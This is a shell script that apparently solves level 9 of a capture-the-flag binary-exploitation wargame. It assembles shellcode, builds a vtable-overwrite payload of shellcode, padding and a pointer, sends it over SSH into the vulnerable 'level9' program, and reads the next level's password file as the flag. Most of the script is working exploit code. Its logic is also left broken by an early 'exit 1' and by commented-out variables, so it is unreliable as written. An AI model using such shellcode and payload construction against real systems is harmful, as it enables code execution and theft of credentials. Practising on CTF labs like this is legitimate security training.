#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)"

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

# #### #
# MAIN #
# #### #

generate_exploit_shellcode() {
    trap '[ -n "$tmpdir" ] && rm -rf "$tmpdir"' EXIT INT TERM HUP QUIT;
    tmpdir=$(mktemp -d);

    nasm -f elf32 "$CURR_DIR_PATH/data/exploit.asm" -o "$tmpdir/exploit.o" || return 1;
    ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin" || return 1;
    objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin" || return 1;

    shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
    printf "%s" "$shellcode";

    rm -rf "$tmpdir";
    unset tmpdir shellcode;
    return 0;
}

main() {
    host="${host:-localhost}";
    port="${port:-4242}";
    username="${username:-level9}";
    password="${password}";
    flag="";

    log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";

    shellcode="$(generate_exploit_shellcode)";
    shellcode_byte_length=$(printf "%b" "$shellcode" | wc -c);
    printf "%s\n" "$shellcode";
    printf "%d\n" "$shellcode_byte_length";
    exit 1;
    # [malicious vtbl][shellcode][padding][ptr_to_malicious_vtbl]

    # []

    # # 1. Hardcoded values.
    # intended_shellcode_octal_address="\\010\\240\\004\\010"; # 0x0804a008
    # intended_payload_length="112"; # sizeof(*n1) + n2#metadata = 108 + 4
    
    # # 2. Shellcode
    # shellcode="$(generate_exploit_shellcode)";
    # shellcode_byte_length=$(printf "%b" "$shellcode" | wc -c);

    # # 3. Payload
    # padding_length=$((intended_payload_length - shellcode_byte_length));
    # if [ "$padding_length" -lt "0" ]; then
    #     log "Error: provided shellcode is too long. Must be less than or equal to $intended_payload_length bytes, but it is $shellcode_byte_length bytes.";
    #     return 1;
    # fi

    # printf "Shellcode: '%s'\n" "$shellcode";
    # printf "padding_length: '%d'\n" "$padding_length";
    # printf "shellcode_addr: '%s'\n" "$intended_shellcode_octal_address";

    ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
    (
        printf '%s' 'sleep 1;'; # Not viable but should workout.
        printf '%s' 'cat '/home/user/level9/.pass' > /tmp/flag.txt;';
    )| ssh_exec_via_socket "$host" "$port" "$username" "(printf '%b%*c%b' '$shellcode' '$padding_length' '$intended_shellcode_octal_address'; cat -) | ./level9 >&2";
    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; }
    
    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    log "Flag '$flag' has been written to '$flag_path'";
    echo -n "$flag" > "$flag_path";
}

main "$@";
